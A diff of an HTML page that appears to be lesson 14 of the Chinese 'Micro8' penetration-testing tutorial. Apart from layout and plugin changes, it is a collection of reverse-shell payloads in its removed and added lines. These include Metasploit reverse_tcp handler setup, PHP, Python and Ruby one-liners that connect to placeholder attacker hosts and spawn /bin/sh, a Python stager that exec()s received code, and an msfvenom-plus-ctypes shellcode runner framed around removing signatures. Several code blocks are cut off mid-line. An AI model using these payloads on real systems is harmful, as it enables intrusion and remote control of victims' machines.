@@ -1,14 +1,14 @@
 
 <!DOCTYPE HTML>
-<html lang="" >
+<html lang="zh-hans" >
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>第十四课：基于第十课补充payload1 · GitBook</title>
+        <title>第十四课：基于第十课补充payload1 · Micro8 系列教程</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
-        
+        <meta name="author" content="Micro8 系列作者">
         
         
     
@@ -17,17 +17,33 @@
     
             
                 
-                <link rel="stylesheet" href="../gitbook/gitbook-plugin-highlight/website.css">
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search-plus/search.css">
                 
             
                 
-                <link rel="stylesheet" href="../gitbook/gitbook-plugin-search/search.css">
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-prism/prism-darcula.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-splitter/splitter.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-tbfed-pagefooter/footer.css">
+                
+            
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-donate/plugin.css">
                 
             
                 
                 <link rel="stylesheet" href="../gitbook/gitbook-plugin-fontsettings/website.css">
                 
             
+                
+                <link rel="stylesheet" href="../gitbook/gitbook-plugin-theme-comscore/test.css">
+                
+            
         
 
     
@@ -47,6 +63,7 @@
     
 
         
+    
     
     
     <meta name="HandheldFriendly" content="true"/>
@@ -63,6 +80,17 @@
     <link rel="prev" href="13_基于ARP发现内网存活主机.html" />
     
 
+    <style>
+    @media only screen and (max-width: 640px) {
+        .book-header .hidden-mobile {
+            display: none;
+        }
+    }
+    </style>
+    <script>
+        window["gitbook-plugin-github-buttons"] = {"repo":"https://github.com/Micropoor/Micro8","types":["star","watch","fork"],"size":"small"};
+    </script>
+
     </head>
     <body>
         
@@ -71,7 +99,7 @@
         
             
 <div id="book-search-input" role="search">
-    <input type="text" placeholder="Type to search" />
+    <input type="text" placeholder="输入并搜索" />
 </div>
 
             
@@ -82,7 +110,21 @@
 <ul class="summary">
     
     
+    
+        
+        <li>
+            <a href="https://micropoor.blogspot.com" target="_blank" class="custom-link">Micropoor</a>
+        </li>
+    
+        
+        <li>
+            <a href="https://github.com/micro8" target="_blank" class="custom-link">Github Micro8</a>
+        </li>
+    
+    
 
+    
+    <li class="divider"></li>
     
 
     
@@ -1785,7 +1827,7 @@
 
     <li>
         <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
-            Published with GitBook
+            本书使用 GitBook 发布
         </a>
     </li>
 </ul>
@@ -1818,7 +1860,7 @@
                     <div class="page-wrapper" tabindex="-1" role="main">
                         <div class="page-inner">
                             
-<div id="book-search-results">
+<div class="search-plus" id="book-search-results">
     <div class="search-noresults">
     
                                 <section class="normal markdown-section">
@@ -1827,87 +1869,90 @@
 <p>&#x8FD9;&#x6B21;&#x4E3B;&#x8981;&#x8865;&#x5145;&#x4E86; PHP&#xFF0C;python&#xFF0C;ruby&#x3002;</p>
 <p>ps:&#x5728;&#x7EBF;&#x4EE3;&#x7801;&#x9AD8;&#x4EAE;&#xFF1A;<a href="http://tool.oschina.net/highlight" target="_blank">http://tool.oschina.net/highlight</a></p>
 <h3 id="1&#x3001;php-payload">1&#x3001;php-payload</h3>
-<pre><code class="lang-bash">msf &gt; use exploit/multi/handler
-msf exploit(handler) &gt; <span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp 
-payload =&gt; windows/meterpreter/reverse_tcp
-msf exploit(handler) &gt; <span class="hljs-built_in">set</span> LHOST 192.168.1.107
-LHOST =&gt; 192.168.1.107
+<pre class="language-"><code class="lang-bash">msf <span class="token operator">&gt;</span> use exploit/multi/handler
+msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> payload windows/meterpreter/reverse_tcp 
+payload <span class="token operator">=</span><span class="token operator">&gt;</span> windows/meterpreter/reverse_tcp
+msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> LHOST 192.168.1.107
+LHOST <span class="token operator">=</span><span class="token operator">&gt;</span> 192.168.1.107
 </code></pre>
-<pre><code class="lang-php"><span class="hljs-meta">&lt;?</span>
-php error_reporting(<span class="hljs-number">0</span>)&#x37E; $ip = <span class="hljs-string">&apos;x.x.x.x&apos;</span>&#x37E; $port = <span class="hljs-number">53</span>&#x37E; <span class="hljs-keyword">if</span> (($f = <span class="hljs-string">&apos;stream_socket_client&apos;</span>) &amp;&amp; is_callable($f)) { 
-{$port}<span class="hljs-string">&quot;)&#x37E; $s_type = &apos;stream&apos;&#x37E; } if (!$s &amp;&amp; ($f = &apos;fsockopen&apos;) &amp;&amp; is_callable($f)) { $s = $f($ip, $port)&#x37E; $s_ 
-strlen($b))&#x37E; break&#x37E; case &apos;socket&apos;: $b .= socket_read($s, $len-strlen($b))&#x37E; break&#x37E; } } $GLOBALS[&apos;msgsock&apos;] = $s&#x37E;
-$GLOBALS[&apos;msgsock_type&apos;] = $s_type&#x37E; if (extension_loaded(&apos;s 
-&gt;
-</span></code></pre>
+<pre class="language-"><code class="lang-php"><span class="token delimiter important">&lt;?</span>
+php <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>&#x37E; <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token single-quoted-string string">&apos;x.x.x.x&apos;</span>&#x37E; <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">53</span>&#x37E; <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token single-quoted-string string">&apos;stream_socket_client&apos;</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> 
+<span class="token punctuation">{</span><span class="token variable">$port</span><span class="token punctuation">}</span>&quot;<span class="token punctuation">)</span>&#x37E; <span class="token variable">$s_type</span> <span class="token operator">=</span> <span class="token single-quoted-string string">&apos;stream&apos;</span>&#x37E; <span class="token punctuation">}</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token single-quoted-string string">&apos;fsockopen&apos;</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">)</span>&#x37E; <span class="token variable">$s_</span> 
+<span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span>&#x37E; <span class="token keyword">break</span>&#x37E; <span class="token keyword">case</span> <span class="token single-quoted-string string">&apos;socket&apos;</span><span class="token punctuation">:</span> <span class="token variable">$b</span> <span class="token punctuation">.</span><span class="token operator">=</span> <span class="token function">socket_read</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token operator">-</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span>&#x37E; <span class="token keyword">break</span>&#x37E; <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token single-quoted-string string">&apos;msgsock&apos;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$s</span>&#x37E;
+<span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token single-quoted-string string">&apos;msgsock_type&apos;</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$s_type</span>&#x37E; <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span>&apos;s 
+<span class="token operator">&gt;</span>
+</code></pre>
 <p><img src="media/c62949c5cacf6d6a5605200311aa5b9a.jpg" alt=""></p>
-<pre><code>&lt;?php
-$sock=fsockopen(&quot;xx.xx.xx.xx&quot;,xx)&#x37E;exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;)&#x37E; 
-?&gt;
-</code></pre><p><img src="media/107730c867318d074cc21b9b490d8e8d.jpg" alt=""></p>
-<h3 id="2&#x3001;python-payload">2&#x3001;python-payload</h3>
-<pre><code class="lang-bash">msf &gt; use exploit/multi/handler
-msf exploit(handler) &gt; <span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp 
-payload =&gt; windows/meterpreter/reverse_tcp
-msf exploit(handler) &gt; <span class="hljs-built_in">set</span> LHOST 192.168.1.107
-LHOST =&gt; 192.168.1.107
+<pre class="language-"><code class="lang-php"><span class="token delimiter important">&lt;?php</span>
+<span class="token variable">$sock</span><span class="token operator">=</span><span class="token function">fsockopen</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;xx.xx.xx.xx&quot;</span><span class="token punctuation">,</span>xx<span class="token punctuation">)</span>&#x37E;<span class="token function">exec</span><span class="token punctuation">(</span><span class="token double-quoted-string string">&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;</span><span class="token punctuation">)</span>&#x37E; 
+<span class="token delimiter important">?&gt;</span>
 </code></pre>
-<pre><code class="lang-python"><span class="hljs-keyword">import</span> socket,struct,time 
-<span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> range(<span class="hljs-number">10</span>):
-    <span class="hljs-keyword">try</span>:
-        s=socket.socket(<span class="hljs-number">2</span>,socket.SOCK_STREAM)
-        s.connect((<span class="hljs-string">&apos;x.x.x.x&apos;</span>,xx)) 
-        <span class="hljs-keyword">break</span>
-    <span class="hljs-keyword">except</span>:
-        time.sleep(<span class="hljs-number">5</span>) l=struct.unpack(<span class="hljs-string">&apos;&gt;I&apos;</span>,s.recv(<span class="hljs-number">4</span>))[<span class="hljs-number">0</span>] 
-d=s.recv(l)
-<span class="hljs-keyword">while</span> len(d)&lt;l: 
-    d+=s.recv(l-len(d))
-exec(d,{<span class="hljs-string">&apos;s&apos;</span>:s})
+<p><img src="media/107730c867318d074cc21b9b490d8e8d.jpg" alt=""></p>
+<h3 id="2&#x3001;python-payload">2&#x3001;python-payload</h3>
+<pre class="language-"><code class="lang-bash">msf <span class="token operator">&gt;</span> use exploit/multi/handler
+msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> payload windows/meterpreter/reverse_tcp 
+payload <span class="token operator">=</span><span class="token operator">&gt;</span> windows/meterpreter/reverse_tcp
+msf exploit<span class="token punctuation">(</span>handler<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token keyword">set</span> LHOST 192.168.1.107
+LHOST <span class="token operator">=</span><span class="token operator">&gt;</span> 192.168.1.107
+</code></pre>
+<pre class="language-"><code class="lang-python"><span class="token keyword">import</span> socket<span class="token punctuation">,</span>struct<span class="token punctuation">,</span>time 
+<span class="token keyword">for</span> x <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">try</span><span class="token punctuation">:</span>
+        s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
+        s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">&apos;x.x.x.x&apos;</span><span class="token punctuation">,</span>xx<span class="token punctuation">)</span><span class="token punctuation">)</span> 
+        <span class="token keyword">break</span>
+    <span class="token keyword">except</span><span class="token punctuation">:</span>
+        time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span> l<span class="token operator">=</span>struct<span class="token punctuation">.</span>unpack<span class="token punctuation">(</span><span class="token string">&apos;&gt;I&apos;</span><span class="token punctuation">,</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> 
+d<span class="token operator">=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>l<span class="token punctuation">)</span>
+<span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token operator">&lt;</span>l<span class="token punctuation">:</span> 
+    d<span class="token operator">+=</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>l<span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">)</span>
+<span class="token keyword">exec</span><span class="token punctuation">(</span>d<span class="token punctuation">,</span><span class="token punctuation">{</span><span class="token string">&apos;s&apos;</span><span class="token punctuation">:</span>s<span class="token punctuation">}</span><span class="token punctuation">)</span>
 </code></pre>
 <p><img src="media/56fa0d76a0ef5b598d14f8a67de449b7.jpg" alt=""></p>
-<pre><code class="lang-python">import socket,subprocess,os&#x37E;
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)&#x37E;s.connect((&quot;xx.xx.xx.xx&quot;,xx))&#x37E;
-i&quot;])&#x37E;
+<pre class="language-"><code class="lang-python"><span class="token keyword">import</span> socket<span class="token punctuation">,</span>subprocess<span class="token punctuation">,</span>os&#x37E;
+s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span>socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>&#x37E;s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">&quot;xx.xx.xx.xx&quot;</span><span class="token punctuation">,</span>xx<span class="token punctuation">)</span><span class="token punctuation">)</span>&#x37E;
+i&quot;<span class="token punctuation">]</span><span class="token punctuation">)</span>&#x37E;
 </code></pre>
 <p><img src="media/268f5cbb31121e9d7f37909587296e7a.jpg" alt=""></p>
-<pre><code class="lang-python"><span class="hljs-keyword">import</span> socket <span class="hljs-keyword">import</span> subprocess
+<pre class="language-"><code class="lang-python"><span class="token keyword">import</span> socket <span class="token keyword">import</span> subprocess
 
-s=socket.socket()
-s.connect((<span class="hljs-string">&quot;xx.xx.xx.xx&quot;</span>,xx)) <span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:
-p = subprocess.Popen(s.recv(<span class="hljs-number">1024</span>), shell=<span class="hljs-keyword">True</span>,stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subpro s.send(p.stdout.read() + p.stderr.read())
+s<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span><span class="token punctuation">)</span>
+s<span class="token punctuation">.</span>connect<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">&quot;xx.xx.xx.xx&quot;</span><span class="token punctuation">,</span>xx<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">while</span> <span class="token number">1</span><span class="token punctuation">:</span>
+p <span class="token operator">=</span> subprocess<span class="token punctuation">.</span>Popen<span class="token punctuation">(</span>s<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token punctuation">,</span> shell<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span>stdout<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stderr<span class="token operator">=</span>subprocess<span class="token punctuation">.</span>PIPE<span class="token punctuation">,</span> stdin<span class="token operator">=</span>subpro s<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">.</span>stdout<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> p<span class="token punctuation">.</span>stderr<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
 </code></pre>
 <p><img src="media/710a81ff2c29a516aa878760e1fbd110.jpg" alt=""></p>
 <p>&#x5220;&#x9664;&#x7279;&#x5F81;&#xFF1A;</p>
-<pre><code class="lang-bash">root@John:~<span class="hljs-comment"># msfvenom -p windows/meterpreter/reverse_tcp LHOST=8.8.8.8 LPORT=88 -f c | tr -d &apos;&quot;&apos; | tr -d &apos;\n&apos;</span>
+<pre class="language-"><code class="lang-bash">root@John:~<span class="token comment"># msfvenom -p windows/meterpreter/reverse_tcp LHOST=8.8.8.8 LPORT=88 -f c | tr -d &apos;&quot;&apos; | tr -d &apos;\n&apos;</span>
 </code></pre>
 <p><img src="media/34aeea621a28e0377b370eda4a63aaa2.jpg" alt=""></p>
-<pre><code class="lang-python">from ctypes import *
+<pre class="language-"><code class="lang-python"><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span>
 
-reverse_shell = &quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72
-micropoorshell = create_string_buffer(reverse_shell, len(reverse_shell))
-shellcode = cast(micropoorshell, CFUNCTYPE(c_void_p))
-shellcode()
+reverse_shell <span class="token operator">=</span> &quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72
+micropoorshell <span class="token operator">=</span> create_string_buffer<span class="token punctuation">(</span>reverse_shell<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>reverse_shell<span class="token punctuation">)</span><span class="token punctuation">)</span>
+shellcode <span class="token operator">=</span> cast<span class="token punctuation">(</span>micropoorshell<span class="token punctuation">,</span> CFUNCTYPE<span class="token punctuation">(</span>c_void_p<span class="token punctuation">)</span><span class="token punctuation">)</span>
+shellcode<span class="token punctuation">(</span><span class="token punctuation">)</span>
 </code></pre>
 <h3 id="2&#x3001;ruby-payload">2&#x3001;ruby-payload</h3>
-<pre><code class="lang-ruby"><span class="hljs-keyword">require</span> <span class="hljs-string">&apos;socket&apos;</span>&#x37E;c=TCPSocket.new(<span class="hljs-string">&quot;xx.xx.xx.xx&quot;</span>, x)&#x37E;$stdin.reopen(c)&#x37E;$stdout.reopen(c)&#x37E;$stderr.reopen(c)&#x37E;$stdi
-(IO.popen(l,<span class="hljs-string">&quot;rb&quot;</span>){|fd| fd.each_line {|o| c.puts(o.strip) }}) <span class="hljs-keyword">rescue</span> <span class="hljs-keyword">nil</span>}
+<pre class="language-"><code class="lang-ruby"><span class="token keyword">require</span> <span class="token string">&apos;socket&apos;</span>&#x37E;c<span class="token operator">=</span><span class="token constant">TCPSocket</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token string">&quot;xx.xx.xx.xx&quot;</span><span class="token punctuation">,</span> x<span class="token punctuation">)</span>&#x37E;<span class="token variable">$stdin</span><span class="token punctuation">.</span><span class="token function">reopen</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>&#x37E;<span class="token variable">$stdout</span><span class="token punctuation">.</span><span class="token function">reopen</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>&#x37E;<span class="token variable">$stderr</span><span class="token punctuation">.</span><span class="token function">reopen</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>&#x37E;<span class="token variable">$stdi</span>
+<span class="token punctuation">(</span><span class="token builtin">IO</span><span class="token punctuation">.</span><span class="token function">popen</span><span class="token punctuation">(</span>l<span class="token punctuation">,</span><span class="token string">&quot;rb&quot;</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token operator">|</span>fd<span class="token operator">|</span> fd<span class="token punctuation">.</span>each_line <span class="token punctuation">{</span><span class="token operator">|</span>o<span class="token operator">|</span> c<span class="token punctuation">.</span><span class="token function">puts</span><span class="token punctuation">(</span>o<span class="token punctuation">.</span>strip<span class="token punctuation">)</span> <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token keyword">rescue</span> <span class="token keyword">nil</span><span class="token punctuation">}</span>
 </code></pre>
 <p><img src="media/5253458a976fd4e0212059638751245b.jpg" alt=""></p>
-<pre><code class="lang-ruby"><span class="hljs-keyword">require</span> <span class="hljs-string">&apos;socket&apos;</span>&#x37E;f=TCPSocket.open(<span class="hljs-string">&quot;xx.xx.xx.xx&quot;</span>,xx).to_i&#x37E;exec sprintf(<span class="hljs-string">&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;</span>,f,f,f)
+<pre class="language-"><code class="lang-ruby"><span class="token keyword">require</span> <span class="token string">&apos;socket&apos;</span>&#x37E;f<span class="token operator">=</span><span class="token constant">TCPSocket</span><span class="token punctuation">.</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">&quot;xx.xx.xx.xx&quot;</span><span class="token punctuation">,</span>xx<span class="token punctuation">)</span><span class="token punctuation">.</span>to_i&#x37E;exec <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string">&quot;/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d&quot;</span><span class="token punctuation">,</span>f<span class="token punctuation">,</span>f<span class="token punctuation">,</span>f<span class="token punctuation">)</span>
 </code></pre>
 <p><img src="media/b9032b829c6a977288c32948088801b6.jpg" alt=""></p>
-<pre><code class="lang-ruby"><span class="hljs-keyword">require</span> <span class="hljs-string">&apos;socket&apos;</span>&#x37E;c=TCPSocket.new(<span class="hljs-string">&quot;xx.xx.xx.xx&quot;</span>,<span class="hljs-string">&quot;xx&quot;</span>)&#x37E;<span class="hljs-keyword">while</span>(cmd=c.gets)&#x37E;IO.popen(cmd,<span class="hljs-string">&quot;r&quot;</span>){|io|c.print io.read}<span class="hljs-keyword">end</span>
+<pre class="language-"><code class="lang-ruby"><span class="token keyword">require</span> <span class="token string">&apos;socket&apos;</span>&#x37E;c<span class="token operator">=</span><span class="token constant">TCPSocket</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token string">&quot;xx.xx.xx.xx&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;xx&quot;</span><span class="token punctuation">)</span>&#x37E;<span class="token keyword">while</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span>c<span class="token punctuation">.</span>gets<span class="token punctuation">)</span>&#x37E;<span class="token builtin">IO</span><span class="token punctuation">.</span><span class="token function">popen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token string">&quot;r&quot;</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token operator">|</span>io<span class="token operator">|</span>c<span class="token punctuation">.</span>print io<span class="token punctuation">.</span>read<span class="token punctuation">}</span><span class="token keyword">end</span>
 </code></pre>
 <p><img src="media/cdb7a522f8eb1facc72265a923ef173e.jpg" alt=""></p>
-<pre><code class="lang-ruby">c=TCPSocket.new(<span class="hljs-string">&quot;xx.xx.xx.xx&quot;</span>,<span class="hljs-string">&quot;xx&quot;</span>)&#x37E;<span class="hljs-keyword">while</span>(cmd=c.gets)&#x37E;IO.popen(cmd,<span class="hljs-string">&quot;r&quot;</span>){\|io\|c.print
-io.read}<span class="hljs-keyword">end</span>
+<pre class="language-"><code class="lang-ruby">c<span class="token operator">=</span><span class="token constant">TCPSocket</span><span class="token punctuation">.</span><span class="token keyword">new</span><span class="token punctuation">(</span><span class="token string">&quot;xx.xx.xx.xx&quot;</span><span class="token punctuation">,</span><span class="token string">&quot;xx&quot;</span><span class="token punctuation">)</span>&#x37E;<span class="token keyword">while</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span>c<span class="token punctuation">.</span>gets<span class="token punctuation">)</span>&#x37E;<span class="token builtin">IO</span><span class="token punctuation">.</span><span class="token function">popen</span><span class="token punctuation">(</span>cmd<span class="token punctuation">,</span><span class="token string">&quot;r&quot;</span><span class="token punctuation">)</span><span class="token punctuation">{</span>\<span class="token operator">|</span>io\<span class="token operator">|</span>c<span class="token punctuation">.</span>print
+io<span class="token punctuation">.</span>read<span class="token punctuation">}</span><span class="token keyword">end</span>
 </code></pre>
 <p><img src="media/9246e2313d4cbcb3c4dacced7c25e0c1.jpg" alt=""></p>
 <blockquote>
 <p>  Micropoor</p>
 </blockquote>
-
+<footer class="page-footer"><span class="copyright">Copyright &#xA9; Micro8 2018 all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A;
+2019-02-25 20:31
+</span></footer>
                                 
                                 </section>
                             
@@ -1950,7 +1995,7 @@ io.read}<span class="hljs-keyword">end</span>
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"第十四课：基于第十课补充payload1","level":"1.4.14","depth":2,"next":{"title":"第十五课：基于第十课补充payload2","level":"1.4.15","depth":2,"path":"Chapter1/15_基于第十课补充payload2.md","ref":"Chapter1/15_基于第十课补充payload2.md","articles":[]},"previous":{"title":"第十三课：基于ARP发现内网存活主机","level":"1.4.13","depth":2,"path":"Chapter1/13_基于ARP发现内网存活主机.md","ref":"Chapter1/13_基于ARP发现内网存活主机.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"Chapter1/14_基于第十课补充payload1.md","mtime":"2019-02-23T07:48:28.035Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2019-02-25T04:00:06.266Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"第十四课：基于第十课补充payload1","level":"1.4.14","depth":2,"next":{"title":"第十五课：基于第十课补充payload2","level":"1.4.15","depth":2,"path":"Chapter1/15_基于第十课补充payload2.md","ref":"Chapter1/15_基于第十课补充payload2.md","articles":[]},"previous":{"title":"第十三课：基于ARP发现内网存活主机","level":"1.4.13","depth":2,"path":"Chapter1/13_基于ARP发现内网存活主机.md","ref":"Chapter1/13_基于ARP发现内网存活主机.md","articles":[]},"dir":"ltr"},"config":{"plugins":["-lunr","-search","search-plus","-highlight","prism","theme-comscore","splitter","-sharing","sharing-plus","-expandable-chapters-small","simple-page-toc","github","github-buttons","tbfed-pagefooter","donate","ga"],"root":".","styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"pluginsConfig":{"tbfed-pagefooter":{"copyright":"Copyright © Micro8 2018","modify_label":"修订时间：","modify_format":"YYYY-MM-DD HH:mm"},"prism":{"css":["prism-themes/themes/prism-darcula.css"]},"github":{"url":"https://github.com/micro8"},"simple-page-toc":{"maxDepth":3,"skipFirstH1":true},"splitter":{},"sharing-plus":{"qq":false,"all":["facebook","google","twitter","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":true,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":true,"messenger":false,"line":false,"vk":false,"pocket":true,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"donate":{"alipay":"","alipayText":"支付宝打赏","button":"赞赏码","title":"有读者问赞赏码，如下，自愿：","wechat":"./dashang.png","wechatText":""},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-comscore":{},"github-buttons":{"repo":"https://github.com/Micropoor/Micro8","types":["star","watch","fork"],"size":"small"},"ga":{"configuration":"auto","token":"UA-135003278-1"},"sharing":{"qq":false,"all":["facebook","google","twitter","weibo","instapaper","linkedin","pocket","stumbleupon"],"douban":false,"facebook":false,"weibo":false,"instapaper":false,"whatsapp":false,"hatenaBookmark":false,"twitter":false,"messenger":false,"line":false,"vk":false,"pocket":false,"google":false,"viber":false,"stumbleupon":false,"qzone":false,"linkedin":false},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"search-plus":{}},"theme":"default","author":"Micro8 